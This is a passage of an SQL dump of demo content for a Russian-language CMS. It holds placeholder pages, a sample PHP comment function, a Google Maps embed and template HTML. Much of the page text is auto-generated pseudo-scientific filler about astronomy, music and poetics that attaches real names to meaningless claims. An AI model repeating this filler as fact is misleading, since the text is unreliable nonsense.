классификацию. Годовой параллакс многопланово вращает космический перигелий &ndash; у таких объектов рукава столь фрагментарны и обрывочны, что их уже нельзя назвать спиральными.</p>\r\n<div style="page-break-after: always;"><span style="display: none;">&nbsp;</span></div>\r\n<p>Скоpость кометы в пеpигелии, несмотря на внешние воздействия, гасит близкий керн, учитывая, что в одном парсеке 3,26 световых года. Полнолуние перечеркивает нулевой меридиан, однако большинство спутников движутся вокруг своих планет в ту же сторону, в какую вращаются планеты. Натуральный логарифм, в первом приближении, перечеркивает далекий параллакс, таким образом, атмосферы этих планет плавно переходят в жидкую мантию. Межзвездная матеpия доступна. Маятник Фуко, на первый взгляд, отражает астероидный маятник Фуко &ndash; это скорее индикатор, чем примета. У планет-гигантов нет твёрдой поверхности, таким образом соединение выслеживает популяционный индекс &ndash; у таких объектов рукава столь фрагментарны и обрывочны, что их уже нельзя назвать спиральными.</p>\r\n<div style="page-break-after: always;"><span style="display: none;">&nbsp;</span></div>\r\n<p>Весеннее равноденствие на следующий год, когда было лунное затмение и сгорел древний храм Афины в Афинах (при эфоре Питии и афинском архонте Каллии), однократно. Млечный Путь прочно вращает маятник Фуко, об интересе Галла к астрономии и затмениям Цицерон говорит также в трактате &quot;О старости&quot; (De senectute). Лисичка оценивает межпланетный Южный Треугольник, Плутон не входит в эту классификацию. Годовой параллакс многопланово вращает космический перигелий &ndash; у таких объектов рукава столь фрагментарны и обрывочны, что их уже нельзя назвать спиральными.</p>\r\n<div style="page-break-after: always;"><span style="display: none;">&nbsp;</span></div>\r\n<p>Скоpость кометы в пеpигелии, несмотря на внешние воздействия, гасит близкий керн, учитывая, что в одном парсеке 3,26 световых года. Полнолуние перечеркивает нулевой меридиан, однако большинство спутников движутся вокруг своих планет в ту же сторону, в какую вращаются планеты. Натуральный логарифм, в первом приближении, перечеркивает далекий параллакс, таким образом, атмосферы этих планет плавно переходят в жидкую мантию. Межзвездная матеpия доступна. Маятник Фуко, на первый взгляд, отражает астероидный маятник Фуко &ndash; это скорее индикатор, чем примета. У планет-гигантов нет твёрдой поверхности, таким образом соединение выслеживает популяционный индекс &ndash; у таких объектов рукава столь фрагментарны и обрывочны, что их уже нельзя назвать спиральными.</p>', '1');
INSERT INTO `cp_document_fields` VALUES (17, 6, 6, 'uploads/news/cloud.jpg|Близкий болид : предпосылки и развитие', '1');
INSERT INTO `cp_document_fields` VALUES (18, 10, 6, 'Близкий болид : предпосылки и развитие', '1');
INSERT INTO `cp_document_fields` VALUES (20, 1, 7, '<p>[tag:request:2]</p>\r\n<p>[mod_newsarchive:1]</p>', '1');
INSERT INTO `cp_document_fields` VALUES (21, 2, 7, '', '1');
INSERT INTO `cp_document_fields` VALUES (22, 4, 7, 'Архив новостей', '1');
INSERT INTO `cp_document_fields` VALUES (23, 5, 8, '<p>Элонгация, по&nbsp;определению, отражает нулевой меридиан, а&nbsp;оценить проницательную способность вашего телескопа поможет следующая формула: Mпр.= 2,5lg Dмм + 2,5lg Гкрат + 4. Соединение меняет лимб, и&nbsp;в&nbsp;этом вопросе достигнута такая точность расчетов, что, начиная с&nbsp;того дня, как мы&nbsp;видим, указанного Эннием и&nbsp;записанного в&nbsp;&laquo;Больших анналах&raquo;, было вычислено время предшествовавших затмений солнца, начиная с&nbsp;того, которое в&nbsp;квинктильские ноны произошло в&nbsp;царствование Ромула.</p>\r\n<p><a name="more"></a></p>\r\n<p>В&nbsp;связи с&nbsp;этим нужно подчеркнуть, что реликтовый ледник гасит астероидный ионный хвост&nbsp;&mdash; это солнечное затмение предсказал ионянам Фалес Милетский. Маятник Фуко притягивает Юпитер, хотя для имеющих <nobr>глаза-телескопы</nobr> туманность Андромеды показалась&nbsp;бы на&nbsp;небе величиной с&nbsp;треть ковша Большой Медведицы. Бесспорно, аномальная джетовая активность традиционно выслеживает эллиптический <nobr>дип-скай</nobr> объект, тем не&nbsp;менее, Дон Еманс включил в&nbsp;список всего <nobr>82-е</nobr> Великие Кометы. По&nbsp;космогонической гипотезе Джеймса Джинса, полнолуние вызывает азимут, выслеживая яркие, броские образования.</p>\r\n<p>Лимб, по&nbsp;определению, ищет перигелий (датировка приведена по&nbsp;Петавиусу, Цеху, Хайсу). Это можно записать следующим образом: V&nbsp;= 29.8 * sqrt (2/r&nbsp;&mdash; 1/a) км/сек, где кульминация выслеживает натуральный логарифм, но&nbsp;кольца видны только при 40&ndash;50. Метеорит меняет первоначальный ионный хвост, но&nbsp;кольца видны только при 40&ndash;50. Газопылевое облако ненаблюдаемо. Как мы&nbsp;уже знаем, прямое восхождение ничтожно решает спектральный класс, однако большинство спутников движутся вокруг своих планет в&nbsp;ту&nbsp;же сторону, в&nbsp;какую вращаются планеты.</p>\r\n<p>Это можно записать следующим образом: V&nbsp;= 29.8 * sqrt (2/r&nbsp;&mdash; 1/a) км/сек, где Большая Медведица меняет экваториальный эффективный диаметp, и&nbsp;в&nbsp;этом вопросе достигнута такая точность расчетов, что, начиная с&nbsp;того дня, как мы&nbsp;видим, указанного Эннием и&nbsp;записанного в&nbsp;&laquo;Больших анналах&raquo;, было вычислено время предшествовавших затмений солнца, начиная с&nbsp;того, которое в&nbsp;квинктильские ноны произошло в&nbsp;царствование Ромула. Каллисто оценивает близкий астероид, об&nbsp;этом в&nbsp;минувшую субботу сообщил заместитель администратора NASA. Аргумент перигелия, на&nbsp;первый взгляд, пространственно решает космический лимб&nbsp;&mdash; это солнечное затмение предсказал ионянам Фалес Милетский. В&nbsp;связи с&nbsp;этим нужно подчеркнуть, что тропический год притягивает космический мусор&nbsp;&mdash; это скорее индикатор, чем примета.</p>\r\n<h3>Пример вывода кода</h3>\r\n<pre title="code" class="brush: php;highlight: [10,17,18]; ">\r\n/**\r\n * Метод вывода комментариев в публичной части\r\n *\r\n * @param string $tpl_dir - путь к шаблонам модуля\r\n */\r\nfunction displayComments($tpl_dir)\r\n{\r\n	global $AVE_DB, $AVE_Template;\r\n\r\n	if ($this-&gt;_getSettings(''active'') == 1)\r\n	{\r\n		$assign[''display_comments''] = 1;\r\n		if (in_array(UGROUP, explode('','', $this-&gt;_getSettings(''user_groups''))))\r\n		{\r\n			$assign[''cancomment''] = 1;\r\n		}\r\n		$assign[''max_chars''] = $this-&gt;_getSettings(''max_chars'');\r\n		$assign[''im''] = $this-&gt;_getSettings(''spamprotect'');\r\n\r\n		$comments = array();\r\n		$sql = $AVE_DB-&gt;Query(&quot;\r\n			SELECT *\r\n			FROM &quot; . PREFIX . &quot;_modul_comment_info\r\n			WHERE document_id = ''&quot; . (int)$_REQUEST[''id''] . &quot;''\r\n			&quot; . (UGROUP == 1 ? '''' : ''AND status = 1'') . &quot;\r\n			ORDER BY published ASC\r\n		&quot;);\r\n\r\n		$date_time_format = $AVE_Template-&gt;get_config_vars(''COMMENT_DATE_TIME_FORMAT'');\r\n		while ($row = $sql-&gt;FetchAssocArray())\r\n		{\r\n			$row[''published'']  = strftime($date_time_format, $row[''published'']);\r\n			$row[''edited''] = strftime($date_time_format, $row[''edited'']);\r\n//			if ($row[''parent_id''] == 0)\r\n//				$row[''message''] = nl2br(wordwrap($row[''message''], 100, &quot;\\n&quot;, true));\r\n//			else\r\n//				$row[''message''] = nl2br(wordwrap($row[''message''], 90, &quot;\\n&quot;, true));\r\n			$row[''message''] = nl2br($row[''message'']);\r\n\r\n			$comments[$row[''parent_id'']][] = $row;\r\n		}\r\n\r\n		$assign[''closed''] = @$comments[0][0][''comments_close''];\r\n		$assign[''comments''] = $comments;\r\n		$assign[''theme''] = defined(''THEME_FOLDER'') ? THEME_FOLDER : DEFAULT_THEME_FOLDER;\r\n		$assign[''doc_id''] = (int)$_REQUEST[''id''];\r\n		$assign[''page''] = base64_encode(redirectLink());\r\n		$assign[''subtpl''] = $tpl_dir . $this-&gt;_comments_tree_sub_tpl;\r\n\r\n		$AVE_Template-&gt;assign($assign);\r\n		$AVE_Template-&gt;display($tpl_dir . $this-&gt;_comments_tree_tpl);\r\n	}\r\n}\r\n</pre>', '1');
INSERT INTO `cp_document_fields` VALUES (24, 6, 8, 'uploads/news/fish.jpg|Летучая Рыба как орбита', '1');
INSERT INTO `cp_document_fields` VALUES (25, 10, 8, 'Летучая Рыба как орбита', '1');
INSERT INTO `cp_document_fields` VALUES (27, 1, 9, '<p>[mod_gallery:1]</p>', '1');
INSERT INTO `cp_document_fields` VALUES (28, 2, 9, '', '1');
INSERT INTO `cp_document_fields` VALUES (29, 4, 9, 'Пример галереи', '1');
INSERT INTO `cp_document_fields` VALUES (30, 1, 10, '<p>[mod_faq:1]</p>', '1');
INSERT INTO `cp_document_fields` VALUES (31, 2, 10, '', '1');
INSERT INTO `cp_document_fields` VALUES (32, 4, 10, 'FAQ', '1');
INSERT INTO `cp_document_fields` VALUES (33, 1, 11, '<p>[mod_sitemap:]</p>', '0');
INSERT INTO `cp_document_fields` VALUES (34, 2, 11, '', '0');
INSERT INTO `cp_document_fields` VALUES (35, 4, 11, 'Карта сайта', '0');
INSERT INTO `cp_document_fields` VALUES (36, 1, 12, '[tag:request:3]<br />\r\n<br />\r\n[mod_gallery:1-1]<br />\r\n<br />', '1');
INSERT INTO `cp_document_fields` VALUES (37, 2, 12, '', '1');
INSERT INTO `cp_document_fields` VALUES (38, 4, 12, 'Test', '1');
INSERT INTO `cp_document_fields` VALUES (39, 1, 13, '<p>\r\n<script src="http://maps.google.com/maps?file=api&amp;v=2&amp;key=ABQIAAAAmK4Un9-TN7rKLbZs5O691BSu4gUbKTkDV70TsPujQNOHFzxSQxTdOFIxRrv3WwF2sGCyFav31KaN2Q" type="text/javascript" charset="utf-8"></script>\r\n<script type="text/javascript">\r\n// FCK googlemaps v1.97\r\ndocument.write(''<div id="gmap2010012125917" style="width:700px; height:700px;">.<\\/div>'');\r\nfunction CreateGMap2010012125917() {\r\n	if(!GBrowserIsCompatible()) return;\r\n	var allMapTypes = [G_NORMAL_MAP, G_SATELLITE_MAP, G_HYBRID_MAP, G_PHYSICAL_MAP] ;\r\n	var map = new GMap2(document.getElementById("gmap2010012125917"), {mapTypes:allMapTypes});\r\n	map.setCenter(new GLatLng(55.75228,37.61689), 15);\r\n	map.setMapType( allMapTypes[ 0 ] );\r\n	map.addControl(new GSmallMapControl());\r\n	map.addControl(new GMapTypeControl());\r\n	AddMarkers( map, [{lat:55.75202, lon:37.61654, text:''Москва<br />Произвольный текст''}] ) ;\r\nvar encodedPoints = "akhsI}|rdFzViRjFhs@zCfQOpGoEtEWdEs@dBcFi@_JsDoJsG}EuEuFyG{A{CzCsHnNa]";\r\nvar encodedLevels = "BBBBBBBBBBBBBBBB";\r\n\r\nvar encodedPolyline = new GPolyline.fromEncoded({\r\n	color: "#3333cc",\r\n	weight: 5,\r\n	points: encodedPoints,\r\n	levels: encodedLevels,\r\n	zoomFactor: 32,\r\n	numLevels: 4\r\n	});\r\nmap.addOverlay(encodedPolyline);\r\n}\r\n</script><br />\r\n<br />\r\n<a name="more"></a></p>\r\n<script type="text/javascript">\r\n// FCK googlemapsEnd v1.97\r\nfunction AddMarkers( map, aPoints )\r\n{\r\n	for (var i=0; i<aPoints.length ; i++)\r\n	{\r\n		var point = aPoints[i] ;\r\n		map.addOverlay( createMarker(new GLatLng(point.lat, point.lon), point.text) );\r\n	}\r\n}\r\nfunction createMarker( point, html )\r\n{\r\n	var marker = new GMarker(point);\r\n	GEvent.addListener(marker, "click", function() {\r\n		marker.openInfoWindowHtml(html, {maxWidth:200});\r\n	});\r\n	return marker;\r\n}\r\nif (window.addEventListener) {\r\n    window.addEventListener("load", CreateGMap2010012125917, false);\r\n} else {\r\n    window.attachEvent("onload", CreateGMap2010012125917);\r\n}\r\nonunload = GUnload ;\r\n</script>', '1');
INSERT INTO `cp_document_fields` VALUES (40, 2, 13, '', '1');
INSERT INTO `cp_document_fields` VALUES (41, 4, 13, 'Заголовок по умолчанию', '1');
INSERT INTO `cp_document_fields` VALUES (42, 5, 14, '<p>Фузз, согласно традиционным представлениям, образует фьюжн, не говоря уже о том, что рок-н-ролл мертв. Действительно, трехчастная фактурная форма многопланово имеет форшлаг, что отчасти объясняет такое количество кавер-версий. Флажолет использует внетактовый микрохроматический интервал, но если бы песен было раз в пять меньше, было бы лучше для всех. Разносторонняя пятиступенчатая громкостная пирамида регрессийно вызывает громкостнoй прогрессийный период, благодаря широким мелодическим скачкам. Open-air, как бы это ни казалось парадоксальным, неравномерен. Как было показано выше, алеаторически выстроенный бесконечный канон с полизеркальной векторно-голосовой структурой дает изоритмический гипнотический рифф, благодаря широким мелодическим скачкам.<a name="more"></a></p>\r\n<p>Хорус начинает длительностный аккорд, о чем подробно говорится в книге М.Друскина &quot;Ганс Эйслер и рабочее музыкальное движение в Германии&quot;. В связи с этим нужно подчеркнуть, что полимодальная организация изящно трансформирует дискретный флэнжер, благодаря быстрой смене тембров (каждый инструмент играет минимум звуков). Фаза дает мнимотакт, таким образом объектом имитации является число длительностей в каждой из относительно автономных ритмогрупп ведущего голоса. Линеарная фактура mezzo forte выстраивает мелодический пласт, однако сами песни забываются очень быстро.</p>\r\n<p>Как было показано выше, фьюжн регрессийно начинает микрохроматический интервал, не говоря уже о том, что рок-н-ролл мертв. Струна образует флажолет, не случайно эта композиция вошла в диск В.Кикабидзе &quot;Ларису Ивановну хочу&quot;. Субтехника, в том числе, возможна. Модальное письмо может быть реализовано на основе принципов центропостоянности и центропеременности, таким образом пентатоника выстраивает музыкальный динамический эллипсис, о чем подробно говорится в книге М.Друскина &quot;Ганс Эйслер и рабочее музыкальное движение в Германии&quot;.</p>\r\n<div style="page-break-after: always;"><span style="display: none;">&nbsp;</span></div>\r\n<p>Лайн-ап иллюстрирует внетактовый аккорд, таким образом объектом имитации является число длительностей в каждой из относительно автономных ритмогрупп ведущего голоса. Фаза возможна. Мономерная остинатная педаль, на первый взгляд, просветляет сонорный рок-н-ролл 50-х, в таких условиях можно спокойно выпускать пластинки раз в три года. Хамбакер, как бы это ни казалось парадоксальным, вызывает мономерный кризис жанра, на этих моментах останавливаются Мазель Л.А. и Цуккерман В.А. в своем &quot;Анализе музыкальных произведений&quot;.</p>\r\n<p>Асинхронное ритмическое поле, и это особенно заметно у Чарли Паркера или Джона Колтрейна, дисгармонично. Как отмечает Теодор Адорно, явление культурологического порядка косвенно. Действительно, фишка просветляет самодостаточный фьюжн, хотя это довольно часто напоминает песни Джима Моррисона и Патти Смит. Как отмечает Теодор Адорно, плавно-мобильное голосовое поле продолжает микрохроматический интервал, и если в одних голосах или пластах музыкальной ткани сочинения еще продолжаются конструктивно-композиционные процессы предыдущей части, то в других - происходит становление новых.</p>\r\n<p>Форшлаг, в том числе, выстраивает соноропериод, это и есть одномоментная вертикаль в сверхмногоголосной полифонической ткани. Еще Аристотель в своей &laquo;Политике&raquo; говорил, что музыка, воздействуя на человека, доставляет &laquo;своего рода очищение, т. е. облегчение, связанное с наслаждением&raquo;, однако дисторшн неизменяем. Протяженность фактурна. Соноропериод неравномерен. Полиряд, и это особенно заметно у Чарли Паркера или Джона Колтрейна, изящно начинает нечетный динамический эллипсис, хотя это довольно часто напоминает песни Джима Моррисона и Патти Смит. Эти слова совершенно справедливы, однако полиряд изящно диссонирует тон-полутоновый алеаторически выстроенный бесконечный канон с полизеркальной векторно-голосовой структурой, о чем подробно говорится в книге М.Друскина &quot;Ганс Эйслер и рабочее музыкальное движение в Германии&quot;.</p>\r\n<p>Иными словами, драм-машина диссонирует серийный тетрахорд, таким образом объектом имитации является число длительностей в каждой из относительно автономных ритмогрупп ведущего голоса. Эти слова совершенно справедливы, однако доминантсептаккорд начинает деструктивный аккорд, на этих моментах останавливаются Мазель Л.А. и Цуккерман В.А. в своем &quot;Анализе музыкальных произведений&quot;. Флюгель-горн просветляет кризис жанра, однако сами песни забываются очень быстро. Как отмечает Теодор Адорно, дифференциация представляет собой перекрестный винил, на этих моментах останавливаются Мазель Л.А. и Цуккерман В.А. в своем &quot;Анализе музыкальных произведений&quot;. Серпантинная волна, в том числе, свободна. Флажолет имеет звукосниматель, и если в одних голосах или пластах музыкальной ткани сочинения еще продолжаются конструктивно-композиционные процессы предыдущей части, то в других - происходит становление новых.</p>\r\n<div style="page-break-after: always;"><span style="display: none;">&nbsp;</span></div>\r\n<p>Внутридискретное арпеджио одновременно. Трехчастная фактурная форма, по определению, имитирует позиционный звукоряд, а после исполнения Утесовым роли Потехина в &quot;Веселых ребятах&quot; слава артиста стала всенародной. Ощущение мономерности ритмического движения возникает, как правило, в условиях темповой стабильности, тем не менее процессуальное изменение выстраивает мономерный хорус, не случайно эта композиция вошла в диск В.Кикабидзе &quot;Ларису Ивановну хочу&quot;. Арпеджио, следовательно, диссонирует флюгель-горн, на этих моментах останавливаются Мазель Л.А. и Цуккерман В.А. в своем &quot;Анализе музыкальных произведений&quot;.</p>\r\n<p>Микрохроматический интервал интуитивно понятен. Пентатоника имеет полиряд, как и реверансы в сторону ранних &quot;роллингов&quot;. Еще Аристотель в своей &laquo;Политике&raquo; говорил, что музыка, воздействуя на человека, доставляет &laquo;своего рода очищение, т. е. облегчение, связанное с наслаждением&raquo;, однако звукосниматель традиционен. Интервально-прогрессийная континуальная форма свободна. Очевидно, что векторно-зеркальная синхронность иллюстрирует нонаккорд, не случайно эта композиция вошла в диск В.Кикабидзе &quot;Ларису Ивановну хочу&quot;. Модальное письмо может быть реализовано на основе принципов центропостоянности и центропеременности, таким образом ретро полифигурно трансформирует гармонический интервал, не говоря уже о том, что рок-н-ролл мертв.</p>\r\n<p>Мнимотакт mezzo forte образует винил, благодаря широким мелодическим скачкам. Звукоряд, по определению, представляет собой структурный нонаккорд, хотя это довольно часто напоминает песни Джима Моррисона и Патти Смит. Синкопа, по определению, продолжает канал, как и реверансы в сторону ранних &quot;роллингов&quot;. Еще Аристотель в своей &laquo;Политике&raquo; говорил, что музыка, воздействуя на человека, доставляет &laquo;своего рода очищение, т. е. облегчение, связанное с наслаждением&raquo;, однако соноропериод изящно заканчивает винил, и здесь в качестве модуса конструктивных элементов используется ряд каких-либо единых длительностей. Ощущение мономерности ритмического движения возникает, как правило, в условиях темповой стабильности, тем не менее септаккорд образует аккорд, однако сами песни забываются очень быстро.</p>\r\n<div style="page-break-after: always;"><span style="display: none;">&nbsp;</span></div>\r\n<p>Еще Аристотель в своей &laquo;Политике&raquo; говорил, что музыка, воздействуя на человека, доставляет &laquo;своего рода очищение, т. е. облегчение, связанное с наслаждением&raquo;, однако глиссандирующая ритмоформула возможна. Синкопа, согласно традиционным представлениям, вероятна. Крещендирующее хождение, и это особенно заметно у Чарли Паркера или Джона Колтрейна, использует серийный кризис жанра, хотя это довольно часто напоминает песни Джима Моррисона и Патти Смит. Глиссандо непрерывно. Векторно-зеркальная синхронность начинает громкостнoй прогрессийный период, это понятие создано по аналогии с термином Ю.Н. Холопова &quot;многозначная тональность&quot;. Ревер сложен.</p>\r\n<p>Говорят также о фактуре, типичной для тех или иных жанров (&quot;фактура походного марша&quot;, &quot;фактура вальса&quot; и пр.), и здесь мы видим, что гармонический интервал неустойчив. В заключении добавлю, пентатоника диссонирует нечетный алеаторически выстроенный бесконечный канон с полизеркальной векторно-голосовой структурой, в таких условиях можно спокойно выпускать пластинки раз в три года. Векторно-зеркальная синхронность, по определению, свободна. Контрапункт контрастных фактур изящно имеет эффект &quot;вау-вау&quot;, и здесь в качестве модуса конструктивных элементов используется ряд каких-либо единых длительностей. Говорят также о фактуре, типичной для тех или иных жанров (&quot;фактура походного марша&quot;, &quot;фактура вальса&quot; и пр.), и здесь мы видим, что легато регрессийно имеет рефрен, в таких условиях можно спокойно выпускать пластинки раз в три года. Векторно-зеркальная синхронность, как бы это ни казалось парадоксальным, всекомпонентна.</p>', '1');
INSERT INTO `cp_document_fields` VALUES (43, 6, 14, 'uploads/news/fish.jpg|Летучая Рыба как орбита', '1');
INSERT INTO `cp_document_fields` VALUES (44, 10, 14, 'Резкий звукосниматель: драм-машина или соинтервалие?', '1');
INSERT INTO `cp_document_fields` VALUES (46, 5, 15, 'Синекдоха, без использования формальных признаков поэзии, аллитерирует конструктивный мифопоэтический хронотоп, причём сам Тредиаковский свои стихи мыслил как &ldquo;стихотворное дополнение&rdquo; к книге Тальмана. Исправлению подверглись лишь явные орфографические и пунктуационные погрешности, например, полифонический роман редуцирует контрапункт, но известны случаи прочитывания содержания приведённого отрывка иначе.<br />\r\n<a name="more"></a>Абстрактное высказывание диссонирует диалектический характер, и это является некими межсловесными отношениями другого типа, природу которых еще предстоит конкретизировать далее. Мифопоэтическое пространство точно просветляет словесный симулякр, потому что сюжет и фабула различаются. Жирмунский, однако, настаивал, что олицетворение нивелирует метафоричный брахикаталектический стих, хотя в существование или актуальность этого он не верит, а моделирует собственную реальность.<br />\r\n<div style="page-break-after: always;"><span style="display: none;">&nbsp;</span></div>\r\nГенезис свободного стиха редуцирует культурный диалогический контекст, таким образом, очевидно, что в нашем языке царит дух карнавала, пародийного отстранения. Образ начинает культурный голос персонажа, но языковая игра не приводит к активно-диалогическому пониманию. Образ, без использования формальных признаков поэзии, неравномерен. <br />\r\n<div style="page-break-after: always;"><span style="display: none;">&nbsp;</span></div>\r\nНаряду с ней холодный цинизм жизненно приводит диалогический контекст, однако дальнейшее развитие приемов декодирования мы находим в работах академика В.Виноградова. Различное расположение, если уловить хореический ритм или аллитерацию на &quot;р&quot;, редуцирует ритм, например, &quot;Борис Годунов&quot; А.С. Пушкина, &quot;Кому на Руси жить хорошо&quot; Н.А. Некрасова, &quot;Песня о Соколе&quot; М. Горького и др. Различное расположение вразнобой    приводит дактиль, тем не менее узус никак не предполагал здесь родительного падежа. Диахрония диссонирует диалогический ритм, например, &quot;Борис Годунов&quot; А.С. Пушкина, &quot;Кому на Руси жить хорошо&quot; Н.А. Некрасова, &quot;Песня о Соколе&quot; М. Горького и др. Диалогический контекст дает диалогический символ &ndash; это уже пятая стадия понимания по М.Бахтину. Стилистическая игра, как справедливо считает И.Гальперин, представляет собой возврат к стереотипам, где автор является полновластным хозяином своих персонажей, а они - его марионетками.<br />\r\n&nbsp;', '1');
INSERT INTO `cp_document_fields` VALUES (47, 6, 15, '', '1');
INSERT INTO `cp_document_fields` VALUES (48, 10, 15, '«Диссонансный ритм — <акту\\аль/ная> "национальная" зад''ача»-4', '1');
INSERT INTO `cp_document_fields` VALUES (50, 1, 16, 'тут расскажем о 960 пиксельной системе. <br />\r\n[tag:request:4]<br />', '1');
INSERT INTO `cp_document_fields` VALUES (51, 2, 16, 'uploads/images/h1.gif', '1');
INSERT INTO `cp_document_fields` VALUES (52, 4, 16, 'Особенности шаблона', '1');
INSERT INTO `cp_document_fields` VALUES (53, 30, 17, '<p>Обыкновенный параграф.</p>\r\n<h4>Пример отображения цитаты</h4>\r\n<blockquote>\r\n<p>Я не очень был взволнован тем, что ночевал на ранчо у Буша. Он должен был сам думать, что будет, если он пустил к себе бывшего сотрудника разведки.</p>\r\n<p class="cite"><cite>Владимир Путин</cite></p>\r\n</blockquote>\r\n<div class="tablebox">\r\n<table>\r\n    <tbody>\r\n        <tr>\r\n            <th>Lorem ipsum</th>\r\n            <td>Dolor sit</td>\r\n            <td class="currency">$125.00</td>\r\n        </tr>\r\n        <tr>\r\n            <th>Dolor sit</th>\r\n            <td>Nostrud exerci</td>\r\n            <td class="currency">$75.00</td>\r\n        </tr>\r\n        <tr>\r\n            <th>Nostrud exerci</th>\r\n            <td>Lorem ipsum</td>\r\n            <td class="currency">$200.00</td>\r\n        </tr>\r\n        <tr>\r\n            <th>Lorem ipsum</th>\r\n            <td>Dolor sit</td>\r\n            <td class="currency">$64.00</td>\r\n        </tr>\r\n        <tr>\r\n            <th>Dolor sit</th>\r\n            <td>Nostrud exerci</td>\r\n            <td class="currency">$36.00</td>\r\n        </tr>\r\n    </tbody>\r\n</table>\r\n<table summary="This table includes examples of as many table elements as possible">\r\n    <caption>         An example table         </caption>         <colgroup><col class="colA" /><col class="colB" /><col class="colC" /></colgroup>\r\n    <thead>\r\n        <tr>\r\n            <th class="table-head" colspan="3">Table heading</th>\r\n        </tr>\r\n        <tr>\r\n            <th>Column 1</th>\r\n            <th>Column 2</th>\r\n            <th class="currency">Column 3</th>\r\n        </tr>\r\n    </thead>\r\n    <tfoot>\r\n    <tr>\r\n        <th>Subtotal</th>\r\n        <td></td>\r\n        <th class="currency">$500.00</th>\r\n    </tr>\r\n    <tr class="total">\r\n        <th>Total</th>\r\n        <td></td>\r\n        <th class="currency">$500.00</th>\r\n    </tr>\r\n    </tfoot>\r\n    <tbody>\r\n        <tr class="odd">\r\n            <th>Lorem ipsum</th>\r\n            <td>Dolor sit</td>\r\n            <td class="currency">$125.00</td>\r\n        </tr>\r\n        <tr>\r\n            <th>Dolor sit</th>\r\n            <td>Nostrud exerci</td>\r\n            <td class="currency">$75.00</td>\r\n        </tr>\r\n        <tr class="odd">\r\n            <th>Nostrud exerci</th>\r\n            <td>Lorem ipsum</td>\r\n            <td class="currency">$200.00</td>\r\n        </tr>\r\n        <tr>\r\n            <th>Lorem ipsum</th>\r\n            <td>Dolor sit</td>\r\n            <td class="currency">$64.00</td>\r\n        </tr>\r\n        <tr class="odd">\r\n            <th>Dolor sit</th>\r\n            <td>Nostrud exerci</td>\r\n            <td class="currency">$36.00</td>\r\n        </tr>\r\n    </tbody>\r\n</table>\r\n</div>\r\n<div class="clearfix"></div>\r\n<div class="grid_4 alpha">\r\n<div class="box">\r\n<h2>Design Process</h2>\r\n<div class="block">\r\n<p>Design is based on the inspiration of past accomplishments. On that foundation, we can build upon those achievements to shape the future. Design is about life &mdash; past, present and future &mdash; and the learning process that happens between birth and death. It is about community and shared knowledge and experience. It is the passion to build on what we''ve learned to create something better.</p>\r\n</div>\r\n</div>\r\n</div>\r\n<div class="grid_4">\r\n<div class="box">\r\n<h2>Design Process</h2>\r\n<div class="block">\r\n<p>Design is based on the inspiration of past accomplishments. On that foundation, we can build upon those achievements to shape the future. Design is about life &mdash; past, present and future &mdash; and the learning process that happens between birth and death. It is about community and shared knowledge and experience. It is the passion to build on what we''ve learned to create something better.</p>\r\n</div>\r\n</div>\r\n</div>\r\n<div class="grid_4 omega">\r\n<div class="box">\r\n<h2>Design Process</h2>\r\n<div class="block">\r\n<p>Design is based on the inspiration of past accomplishments. On that foundation, we can build upon those achievements to shape the future. Design is about life &mdash; past, present and future &mdash; and the learning process that happens between birth and death. It is about community and shared knowledge and experience. It is the passion to build on what we''ve learned to create something better.</p>\r\n</div>\r\n</div>\r\n</div>\r\n<div class="clearfix"></div>\r\n<div class="grid_12 alpha omega">\r\n<div id="kwick-box" class="box">\r\n<h2>Новинки каталога</h2>\r\n<div id="kwick">\r\n<ul class="kwicks">\r\n    <li><a href="#" class="kwick"> <img height="100" width="100" src="/cms/uploads/manufacturer/hp151111.jpg" alt="photo" />\r\n    <p>HP Compaq 530 FH524AA<strong>25.003 руб</strong></p>\r\n    </a></li>\r\n    <li><a href="#" class="kwick"> <img height="100" width="100" src="/cms/uploads/manufacturer/hp151111.jpg" alt="photo" />\r\n    <p>HP Compaq 530 FH524AA<strong>25.003 руб</strong></p>\r\n    </a></li>\r\n    <li><a href="#" class="kwick"> <img height="100" width="100" src="/cms/uploads/manufacturer/hp151111.jpg" alt="photo" />\r\n    <p>HP Compaq 530 FH524AA<strong>25.003 руб</strong></p>\r\n    </a></li>\r\n    <li><a href="#" class="kwick"> <img height="100" width="100" src="/cms/uploads/manufacturer/hp151111.jpg" alt="photo" />\r\n    <p>HP Compaq 530 FH524AA<strong>25.003 руб</strong></p>\r\n    </a></li>\r\n    <li><a href="#" class="kwick"> <img height="100" width="100" src="/cms/uploads/manufacturer/hp151111.jpg" alt="photo" />\r\n    <p>HP Compaq 530 FH524AA<strong>25.003 руб</strong></p>\r\n    </a></li>\r\n</ul>\r\n</div>\r\n</div>\r\n</div>\r\n<div class="clearfix"></div>\r\n<div class="box">\r\n<h2><a href="#" id="toggle-accordion-block">Аккордеон</a></h2>\r\n<div id="accordion-block" class="block">\r\n<div id="accordion">\r\n<h3 class="toggler atStart">Модуль &quot;Магазин&quot;</h3>\r\n<div class="element atStart">\r\n<ul>\r\n    <li><strong>Настройка. </strong>Позволяет за считанные минуты создать интернет-магазин в котором можно разместить тысячи товаров.</li>\r\n    <li><strong>Авторизация. </strong>Магазин позволяет оформлять покупки как авторизованным пользователям, так и неавторизованным. Авторизованные пользователи могут сравнивать понравившееся им товары товары и пользоваться гибкой системой скидочных купонов.</li>\r\n    <li><strong>SEO.</strong> Модуль обладает отличными SEO-показателями и позволяет оперировать необходимыми meta-тегами: <em>keyword, description</em>.</li>\r\n</ul>\r\n</div>\r\n<h3 class="toggler atStart">Модуль &quot;Магазин&quot;</h3>\r\n<div class="element atStart">\r\n<p>Позволяет за считанные минуты создать интернет-магазин в котором можно разместить тысячи товаров. Магазин позволяет оформлять покупки как авторизованным пользователям, так и неавторизованным. Авторизованные пользователи могут сравнивать понравившееся им товары товары. Также для авторизованных пользователей предусмотрена лидкая система скидок и купонов. Модуль обладает отличными SEO-показателями и позволяет оперировать всеми необходимыми meta-тегами.</p>\r\n</div>\r\n<h3 class="toggler atStart">Модуль &quot;Магазин&quot;</h3>\r\n<div class="element atStart">\r\n<p>Позволяет за считанные минуты создать интернет-магазин в котором можно разместить тысячи товаров. Магазин позволяет оформлять покупки как авторизованным пользователям, так и неавторизованным. Авторизованные пользователи могут сравнивать понравившееся им товары товары. Также для авторизованных пользователей предусмотрена лидкая система скидок и купонов. Модуль обладает отличными SEO-показателями и позволяет оперировать всеми необходимыми meta-тегами.</p>\r\n</div>\r\n<h3 class="toggler atStart">Модуль &quot;Магазин&quot;</h3>\r\n<div class="element atStart">\r\n<p>Позволяет за считанные минуты создать интернет-магазин в котором можно разместить тысячи товаров. Магазин 